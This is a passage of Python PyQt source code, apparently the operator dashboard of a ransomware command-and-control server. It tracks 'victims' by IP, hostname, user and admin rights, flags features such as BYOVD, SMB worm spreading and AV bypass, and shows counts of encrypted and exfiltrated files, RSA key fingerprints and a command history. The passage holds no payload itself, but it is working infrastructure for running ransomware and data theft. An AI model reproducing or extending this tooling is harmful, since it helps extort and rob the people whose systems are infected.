            self.exfil_table.setItem(row, 0, vid_item)

            name_item = QTableWidgetItem(fname)
            name_item.setForeground(QColor("#00ffff"))
            self.exfil_table.setItem(row, 1, name_item)

            self.exfil_table.setItem(row, 2, QTableWidgetItem(size_str))

            mod_item = QTableWidgetItem(modified)
            mod_item.setForeground(QColor("#888888"))
            self.exfil_table.setItem(row, 3, mod_item)

        self.exfil_info_label.setText(f"{len(rows)} files")

    def _open_exfil_file(self, item):
        row = item.row()
        fpath_item = self.exfil_table.item(row, 0)
        if not fpath_item:
            return

        fpath = fpath_item.data(Qt.ItemDataRole.UserRole)
        if not fpath or not os.path.exists(fpath):
            return

        try:
            if os.name == "nt":
                os.startfile(fpath)
            elif sys.platform == "darwin":
                subprocess.Popen(["open", fpath])
            else:
                subprocess.Popen(["xdg-open", fpath])
            # self._append_output(f"[*] Opened: {fpath}")
        except Exception as e:
            self._append_output(f"[!] Cannot open: {e}")

    # ═══════════════════════════════════════════════════════════════
    # UI REFRESH
    # ═══════════════════════════════════════════════════════════════

    def _start_ui_refresh(self):
        self._refresh_timer = QTimer(self)
        self._refresh_timer.timeout.connect(self._refresh_ui)
        self._refresh_timer.start(3000)

    def _refresh_ui(self):
        pass

    def _on_victim_update(self, data):
        try:
            victims = data.get("victims", {})
            stats = data.get("stats", {})
            history = data.get("history", [])

            self.victims_data = victims
            self.stats_data = stats

            for key, value in stats.items():
                if key in self.stat_boxes:
                    self.stat_boxes[key].setText(str(value))

            self._update_victims_table(victims)
            self._update_history_table(history)

            # Refresh hybrid/exfil hanya kalau console window terbuka
            if self._console_window is not None:
                try:
                    self._refresh_hybrid_list()
                except RuntimeError:
                    self._console_window = None

            self._exfil_refresh_counter += 1
            if self._exfil_refresh_counter >= 5:
                self._exfil_refresh_counter = 0
                if self._console_window is not None:
                    try:
                        self._refresh_exfil_list()
                    except RuntimeError:
                        self._console_window = None
        except Exception as e:
            print(f"[!] _on_victim_update error: {e}")
            traceback.print_exc()

    def _update_victims_table(self, victims):
        selected_id = self.current_selected_victim

        self.victims_table.setRowCount(len(victims))

        for row, (vid, v) in enumerate(sorted(victims.items())):
            id_item = QTableWidgetItem(vid)
            id_item.setForeground(QColor("#ffff00"))
            id_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            self.victims_table.setItem(row, 0, id_item)

            self.victims_table.setItem(
                row, 1, QTableWidgetItem(f"{v['ip']}:{v['port']}")
            )

            hostname_item = QTableWidgetItem(v.get("hostname", "?"))
            hostname_item.setForeground(QColor("#8be9fd"))
            self.victims_table.setItem(row, 2, hostname_item)

            os_icon = {"windows": "🪟", "linux": "🐧", "macos": "🍎"}.get(
                v.get("os", "").lower(), "💻"
            )
            self.victims_table.setItem(
                row, 3, QTableWidgetItem(f"{os_icon} {v.get('os', '?')}")
            )

            self.victims_table.setItem(row, 4, QTableWidgetItem(v.get("user", "?")))

            admin_item = QTableWidgetItem("✅" if v.get("is_admin") else "❌")
            admin_item.setForeground(
                QColor("#00ff00") if v.get("is_admin") else QColor("#ff5555")
            )
            admin_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.victims_table.setItem(row, 5, admin_item)

            features = []
            if v.get("byovd_enabled"):
                features.append("BYOVD")
            if v.get("smb_worm_enabled"):
                features.append("SMB")
            if v.get("av_bypass"):
                features.append("AV")
            feat_item = QTableWidgetItem(" ".join(features) if features else "-")
            feat_item.setForeground(QColor("#ff6600"))
            self.victims_table.setItem(row, 6, feat_item)

            status = v.get("status", "unknown")
            status_item = QTableWidgetItem(status)
            status_colors = {
                "connected": "#ffff00",
                "registered": "#00ffff",
                "active": "#00ff00",
                "encrypted": "#ff0000",
                "decrypted": "#00ff00",
                "disconnected": "#555555",
                "killed": "#ff00ff",
            }
            status_item.setForeground(QColor(status_colors.get(status, "#ffffff")))
            if status == "encrypted":
                status_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            self.victims_table.setItem(row, 7, status_item)

            enc_count = str(v.get("encrypted_count", 0)) if v.get("encrypted") else "-"
            enc_item = QTableWidgetItem(enc_count)
            if v.get("encrypted"):
                enc_item.setForeground(QColor("#ff5555"))
            self.victims_table.setItem(row, 8, enc_item)

            exfil_count = (
                str(v.get("exfiltrated_count", 0))
                if v.get("exfiltrated_count", 0) > 0
                else "-"
            )
            exfil_item = QTableWidgetItem(exfil_count)
            if v.get("exfiltrated_count", 0) > 0:
                exfil_item.setForeground(QColor("#ff00ff"))
                exfil_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
            self.victims_table.setItem(row, 9, exfil_item)

            vid_text = v.get("victim_id", "") or "-"
            vid_item = QTableWidgetItem(vid_text)
            vid_item.setForeground(QColor("#00ffff"))
            vid_item.setFont(QFont("Consolas", 8, QFont.Weight.Bold))
            if vid_text != "-":
                vid_item.setToolTip(f"Victim ID: {vid_text}")
            self.victims_table.setItem(row, 10, vid_item)

            fp_text = v.get("key_fingerprint", "") or "-"
            fp_item = QTableWidgetItem(fp_text)
            fp_item.setForeground(QColor("#ffff00"))
            if fp_text != "-":
                fp_item.setToolTip(f"RSA Key Fingerprint: {fp_text}")
            self.victims_table.setItem(row, 11, fp_item)

            mode = v.get("encryption_mode", "unknown")
            mode_item = QTableWidgetItem(mode.upper())
            if mode == "hybrid":
                mode_item.setForeground(QColor("#00ff00"))
                mode_item.setFont(QFont("Consolas", 9, QFont.Weight.Bold))
                mode_item.setToolTip("Hybrid RSA-4096 + AES-256-GCM")
            elif mode == "legacy":
                mode_item.setForeground(QColor("#ffaa00"))
                mode_item.setToolTip("Legacy symmetric encryption")
            else:
                mode_item.setForeground(QColor("#888888"))
            self.victims_table.setItem(row, 12, mode_item)

        if selected_id:
            for row in range(self.victims_table.rowCount()):
                item = self.victims_table.item(row, 0)
                if item and item.text() == selected_id:
                    self.victims_table.selectRow(row)
                    break

    def _update_history_table(self, history):
        if not hasattr(self, "history_table"):
            return
        try:
            self.history_table.setRowCount(len(history))
            for row, entry in enumerate(reversed(history)):
                self.history_table.setItem(
                    row, 0, QTableWidgetItem(entry.get("timestamp", ""))
                )
                self.history_table.setItem(
                    row, 1, QTableWidgetItem(entry.get("client_id", ""))
                )
                cmd_item = QTableWidgetItem(entry.get("command", ""))
                cmd_item.setForeground(QColor("#00ffff"))
                self.history_table.setItem(row, 2, cmd_item)
                self.history_table.setItem(
                    row, 3, QTableWidgetItem(entry.get("status", ""))
                )
        except RuntimeError:
            self.history_table = None

    # ═══════════════════════════════════════════════════════════════
    # UTILITY
    # ═══════════════════════════════════════════════════════════════

    def _append_output(self, text):
        # Selalu append ke console window (kalau ada)
        if hasattr(self, "output_text") and self.output_text is not None:
            try:
                timestamp = datetime.now().strftime("%H:%M:%S")
                line = f"[{timestamp}] {text}"
                self.output_text.append(line)

                # Auto-scroll
                if hasattr(self, "_console_auto_scroll_cb"):
                    if self._console_auto_scroll_cb.isChecked():
                        scrollbar = self.output_text.verticalScrollBar()
                        scrollbar.setValue(scrollbar.maximum())
            except RuntimeError:
                self.output_text = None
        else:
            # Fallback: print ke terminal
            print(text)

    def _make_action_btn(self, text, color, callback):
        btn = QPushButton(text)
        btn.setMinimumHeight(32)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 {color}, stop:1 {self._darken(color, 0.7)});
                color: white;
                font-weight: bold;
                font-size: 9pt;
                padding: 5px 10px;
                border: 1px solid {color};
                border-radius: 3px;
                font-family: 'Consolas', monospace;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 {self._lighten(color, 1.2)}, stop:1 {color});
            }}
            QPushButton:pressed {{ opacity: 0.8; }}
            QPushButton:disabled {{ background: #333; color: #666; border-color: #444; }}
        """)
        btn.clicked.connect(callback)
        btn.setEnabled(False)
        return btn

    def _make_bulk_btn(self, text, color, callback):
        btn = QPushButton(text)
        btn.setMinimumHeight(32)
        btn.setStyleSheet(f"""
            QPushButton {{
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 {color}, stop:1 {self._darken(color, 0.7)});
                color: white;
                font-weight: bold;
                font-size: 9pt;
                padding: 5px 12px;
                border: 1px solid {color};
                border-radius: 3px;
                font-family: 'Consolas', monospace;
            }}
            QPushButton:hover {{
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1,
                    stop:0 {self._lighten(color, 1.2)}, stop:1 {color});
            }}
            QPushButton:pressed {{ opacity: 0.8; }}
            QPushButton:disabled {{ background: #333; color: #666; border-color: #444; }}
        """)
        btn.clicked.connect(callback)
        btn.setEnabled(False)
        return btn

    @staticmethod
    def _darken(color_hex, factor=0.7):
        """Darken hex color."""
        try:
            color_hex = color_hex.lstrip("#")
            r = int(color_hex[0:2], 16)
            g = int(color_hex[2:4], 16)
            b = int(color_hex[4:6], 16)
            r = max(0, int(r * factor))
            g = max(0, int(g * factor))
            b = max(0, int(b * factor))
            return f"#{r:02x}{g:02x}{b:02x}"
        except Exception:
            return color_hex

    @staticmethod
    def _lighten(color_hex, factor=1.2):
        """Lighten hex color."""
        try:
            color_hex = color_hex.lstrip("#")
            r = int(color_hex[0:2], 16)
            g = int(color_hex[2:4], 16)
            b = int(color_hex[4:6], 16)
            r = min(255, int(r * factor))
            g = min(255, int(g * factor))
            b = min(255, int(b * factor))
            return f"#{r:02x}{g:02x}{b:02x}"
        except Exception:
            return color_hex

    @staticmethod
    def _group_style(color="#00ff00"):
        return f"""
            QGroupBox {{
                color: {color};
                border: 1px solid #333333;
                border-radius: 4px;
                margin-top: 6px;
                padding-top: 12px;
                font-weight: bold;
                font-size: 9pt;
                background: #0a0a0a;
            }}
            QGroupBox::title {{
                subcontrol-origin: margin;
                left: 8px;
                padding: 0 8px;
                color: {color};
                background: #0a0a0a;
            }}
        """

    @staticmethod
    def _input_style():
        return """
            QLineEdit {
                background: #0d1117;
                color: #e6edf3;
                border: 1px solid #30363d;
                border-radius: 3px;
                padding: 4px 8px;
                font-family: 'Consolas', monospace;
                font-size: 9pt;
            }
            QLineEdit:focus { border-color: #00ff00; }
            QLineEdit:disabled { color: #555; background: #1a1a1a; }
        """

    def closeEvent(self, event):
        # Close console window
        if self._console_window is not None:
            try:
                self._console_window.close()
                self._console_window = None
            except Exception:
                pass

        if self.server_thread:
            reply = QMessageBox.question(
                self,
                "Confirm Close",
                "C2 Server is running. Stop and close?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            )
            if reply != QMessageBox.StandardButton.Yes:
                event.ignore()
                return
            self._stop_server()
        event.accept()
